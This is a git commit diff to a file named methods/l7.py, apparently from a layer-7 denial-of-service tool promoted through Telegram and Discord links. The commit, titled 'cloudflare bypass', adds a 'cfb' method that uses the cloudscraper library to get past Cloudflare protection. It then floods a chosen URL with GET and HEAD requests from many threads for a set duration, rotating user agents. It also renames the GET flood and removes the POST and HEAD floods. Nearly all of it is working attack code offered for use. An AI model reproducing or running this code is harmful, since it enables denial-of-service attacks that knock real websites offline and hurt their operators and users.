c3353683e622b2f08897e967f7ebdd8354717bf4
cybermad <171419864+cybermads@users.noreply.github.com>
2025-09-06 15:44:49 +0900

    cloudflare bypass

--- methods/l7.py
+++ methods/l7.py
@@ -5,6 +5,7 @@ import requests
 import os
 import random
 import time
+import cloudscraper
 
 useragent = open("ua.txt").read().splitlines()
 
@@ -22,9 +23,8 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
                      ╩═╝╩ ╩ ╩ ╚═╝╩╚═  ╩   {clear}
                     github.com/cybermads
            {zoic}╔═══════════════════════════════════{clear}
-           {zoic}║{clear}  {zoic}-{clear} get     {zoic}|{clear} GET Requests Attack         
-           {zoic}║{clear}  {zoic}-{clear} post    {zoic}|{clear} POST Requests Attack 
-           {zoic}║{clear}  {zoic}-{clear} head    {zoic}|{clear} HEAD Requests Attack 
+           {zoic}║{clear}  {zoic}-{clear} http     {zoic}|{clear} HTTP Flood         
+           {zoic}║{clear}  {zoic}-{clear} cfb      {zoic}|{clear} CloudFlare bypass
            {zoic}╚═══════════════════════════════════{clear}
 
 """)              
@@ -36,10 +36,10 @@ def layer7():
 ╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
 ╚══{zoic}>{clear} """)
          
-        if select.startswith("get"):
+        if select.startswith("http"):
             parts = select.split()
             if len(parts) != 4:
-                print(f"usage{zoic}:{clear} {zoic}get{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}http{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                 input()
                 continue
 
@@ -75,7 +75,7 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
                     {clear}
       {zoic}╔══════════════════════════════════{clear}
-      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}GET Requests{zoic}]{clear} 
+      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}HTTP{zoic}]{clear} 
       {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
       {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
       {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
@@ -85,31 +85,33 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
 ################################################################################################################################
 
-        elif select.startswith("post"):
+        elif select.startswith("cfb"):
             parts = select.split()
             if len(parts) != 4:
-                print(f"usage{zoic}:{clear} {zoic}post{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}cfb{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
                 input()
                 continue
 
             _, url, threads, duration = parts
             threads = int(threads)
             duration = int(duration)
-
-            def post(url, until_datetime):
+            
+            def cloudflare(url, end_time):
+                scraper = cloudscraper.create_scraper()
                 try:
-                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+                    while (end_time - datetime.datetime.now()).total_seconds() > 0:
                         ua = random.choice(useragent)
                         headers = {"User-Agent": ua}
-                        requests.post(url, headers=headers, timeout=5)
+                        scraper.get(url, headers=headers, timeout=10)
+                        scraper.head(url, headers=headers, timeout=10)
                 except:
                     pass
 
             def th(url, threads, duration):
-                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
+                time = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
                 for _ in range(int(threads)):
                     try:
-                        t = threading.Thread(target=post, args=(url, until))
+                        t = threading.Thread(target=cloudflare, args=(url, time))
                         t.start()
                     except:
                         pass
@@ -118,72 +120,28 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
 telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
-                    {zoic}                    
+                {zoic}                    
         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
         ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
-                    {clear}
-      {zoic}╔══════════════════════════════════{clear}
-      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}POST Requests{zoic}]{clear} 
-      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
-      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
-      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
-      {zoic}╚══════════════════════════════════{clear}       
-""")
+                {clear}
+        {zoic}╔══════════════════════════════════{clear}
+        {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}CloudFlare Bypass{zoic}]{clear} 
+        {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
+        {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
+        {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
+        {zoic}╚══════════════════════════════════{clear}       
+            """)
             time.sleep(duration)
 
-################################################################################################################################
 
-        elif select.startswith("head"):
-            parts = select.split()
-            if len(parts) != 4:
-                print(f"usage{zoic}:{clear} {zoic}post{clear} <{zoic}url{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
-                input()
-                continue
 
-            _, url, threads, duration = parts
-            threads = int(threads)
-            duration = int(duration)
 
-            def head(url, until_datetime):
-                try:
-                    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-                        ua = random.choice(useragent)
-                        headers = {"User-Agent": ua}
-                        requests.head(url, headers=headers, timeout=5)
-                except:
-                    pass
-
-            def th(url, threads, duration):
-                until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
-                for _ in range(int(threads)):
-                    try:
-                        t = threading.Thread(target=head, args=(url, until))
-                        t.start()
-                    except:
-                        pass
-
-            th(url, threads, duration)
-            os.system('cls' if os.name == 'nt' else 'clear')
-            print(f"""
-telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
-                    {zoic}                    
-        ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
-        ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ 
-        ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ 
-                    {clear}
-      {zoic}╔══════════════════════════════════{clear}
-      {zoic}║{clear} METHODS{zoic}:{clear} {zoic}[{clear}HEAD Requests{zoic}]{clear}   
-      {zoic}║{clear} URL{zoic}:{clear} {zoic}[{clear}{url}{zoic}]{clear}                
-      {zoic}║{clear} THREADS{zoic}:{clear} {zoic}[{clear}{threads}{zoic}]{clear}                   
-      {zoic}║{clear} TIME{zoic}:{clear} {zoic}[{clear}{duration}{zoic}]{clear}                     
-      {zoic}╚══════════════════════════════════{clear}       
-""")
-            time.sleep(duration)
-
+            
 
 if __name__ == "__main__":
     layer7()
+
 
 
 
